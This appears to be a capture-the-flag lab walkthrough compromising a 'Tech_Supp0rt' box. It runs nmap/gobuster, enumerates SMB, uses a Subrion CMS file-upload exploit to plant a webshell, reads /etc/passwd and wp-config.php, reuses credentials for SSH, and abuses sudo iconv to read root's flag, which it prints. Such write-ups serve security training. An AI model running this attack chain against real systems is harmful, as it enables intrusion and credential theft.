# Tech_Supp0rt1

Laurent Chauvin | April 05, 2024

## Resources

[1] https://gchq.github.io/CyberChef

## Progress

```
export IP=10.10.44.123
```

Nmap scan:
```bash
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 02:02 EDT
Nmap scan report for 10.10.44.123
Host is up (0.090s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2024-04-05T11:33:05+05:30
|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-05T06:03:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.27 seconds
```

Gobuster scan:
```bash
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.44.123
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.44.123/wordpress/]
/test                 (Status: 301) [Size: 311] [--> http://10.10.44.123/test/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

We can see a wordpress subdirectory (probably with another wordpress website) and a test page (with lots of fake popups).

Visiting the default website, we can see the default Apache page.

We find a smb server, with guest account allowed (no password). Let's list the available shares:

```bash
smbclient -L //10.10.44.123 -U guest   

Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

```

Let's access `websvr` and look what's inside:

```bash
smbclient //10.10.44.123/websvr -U guest

Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5700020 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> 

```

Let's check the `enter.txt` file:

```bash
cat enter.txt 

GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

Going to http://10.10.44.123/subrion redirect to local IP address. After some research, I found that Subrion (CMS) login panel is at http://10.10.44.123/subrion/panel.

We can see the website is running Subrion 4.2.1. After an exploit research, we find:

```bash
searchsploit Subrion 4.2.1             

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Exploit Title               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                                                                                                   | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                                                                                    | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                                                                                 | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                                                                          | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                                                                                  | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                                                                                                                                     | php/webapps/51110.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

It seems we could do an Arbitrary File Upload (backdoor) but we need to authenticate. We need to crack admin password first. They say to use a 'magical formula'.

Going back to the admin panel we can see this in the source:

```html
<script>
intelli.pageName = 'error';
intelli.config.url = 'http://10.10.44.123/subrion/';
intelli.config.admin_url = 'http://10.10.44.123/subrion/panel';
intelli.securityToken = 'XkeQ1s3oxXSVSuK415Jkf0EsqyrReVLkEyltUoNC';
</script>
```

and

```html
<script src="//10.10.44.123/subrion/js/admin/login.js?fm=1528932894"></script>
```

Going to the `login.js` we see:

```js
$(function () {
    // special-effects for login page
    if ($('body').width() >= 768) {
        setTimeout(function () {
            $('.login-block').animate({'margin-top': '-260px', opacity: 1, specialEasing: 'ease-in'});
        }, 500);
    }

    // Forgot password functionality
    $('#js-forgot-dialog').on('click', function (e) {
        e.preventDefault();

        $('.login-body').slideUp('fast', function () {
            $('.js-login-body-forgot-password').slideDown('fast');
        });
    });

    $('#js-forgot-dialog-close').on('click', function (e) {
        e.preventDefault();

        $('.js-login-body-forgot-password').slideUp('fast', function () {
            $('.login-body').slideDown('fast');
        });
    });

    // Email validation
    $('#js-forgot-submit').on('click', function (e) {
        e.preventDefault();

        var form = $(this).parent();
        var alertBox = form.find('.alert');

        if (intelli.is_email($('#email').val())) {
            alertBox.fadeOut();
            $.get(intelli.config.url + 'registration.json', form.serialize(), function (response) {
                if ('boolean' === typeof response.result && response.result) {
                    alertBox.fadeOut().removeClass('alert-danger').addClass('alert-success').text(response.message);
                    alertBox.fadeIn();
                }
                else {
                    alertBox.fadeOut().removeClass('alert-success').addClass('alert-danger').text(response.message);
                    alertBox.fadeIn();
                }
            });
        }
        else {
            alertBox.addClass('alert-danger').fadeIn();
        }
    });
});
```

Where the validation seems to come from `intelli.config.url + 'registration.json'`. We previously found `intelli.config.url` being http://10.10.44.123/subrion/. Let's go to the `registration.json` file. Unfortunately, it sends back to local IP.

Going back to the password, the hint 'magic formula' made me think to the Magic function from [1], which yields:

```
From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)
From_Base32('A-Z2-7=',false)
From_Base64('A-Za-z0-9+/=',true,false)
```

And the password `Scam2021`. Let's login in the admin panel now.

Now let's try to run the Arbitrary File Upload:

```bash
searchsploit -m php/webapps/49876.py

  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
    Codes: CVE-2018-19422
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (956)
Copied to: /home/kali/ctf/thm/Tech_Supp0rt1/49876.py
```

And run it

```bash
python3 49876.py -u http://10.10.44.123/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.44.123/subrion/panel/
[+] Success!
[+] Got CSRF token: LHwMbqFNh5OCgCAGQQb8NQznH9pSYVcpFDLwiItH
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: iwscqvdxguwkymn

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.44.123/subrion/panel/uploads/iwscqvdxguwkymn.phar 

$ whoami
www-data
```

We're connected !!

Let's check who are the users:

```bash
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
mysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false
```

We notice a user called `scamsite`. I tried to ssh with this username and `Scam2021` as password, but it didn't work.

Let's dig into the files. We know there is a wordpress website, were credentials were missing in `enter.txt`. Let's check this out:

```bash
$ ls ../../wordpress

index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```

Let's look at `wp-config.php`:

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

We find some credentials `support:ImAScammerLOL!123!` for the database. Let's try to use the same credentials to login to the wordpress admin panel http://10.10.44.123/wordpress/wp-admin.

It works !! 

As they reused this password, it's also possible they reused it for their ssh credentials. Trying with the login `scamsite`, we manage to get a shell !!

When looking at the bash history of the user, we find this:

```bash
scamsite@TechSupport:~$ cat .bash_history 

cd ~
cat /root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
echo "" > .bash_history 
su root
exit
sudo -l
cd ..
cd ~
sudo -l
su root
exit
```

Apparently, user can run `iconv` as sudo, which can be verified:

```bash
scamsite@TechSupport:~$ sudo -l

Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

By running the same command as he did `sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"` we can 'convert' the input file from one format to another (here the same format is specified) and if no output file is specified, the result is displayed.

## Flag

```
851b8233a8c09400ec30651bd1529bf1ed02790b
```
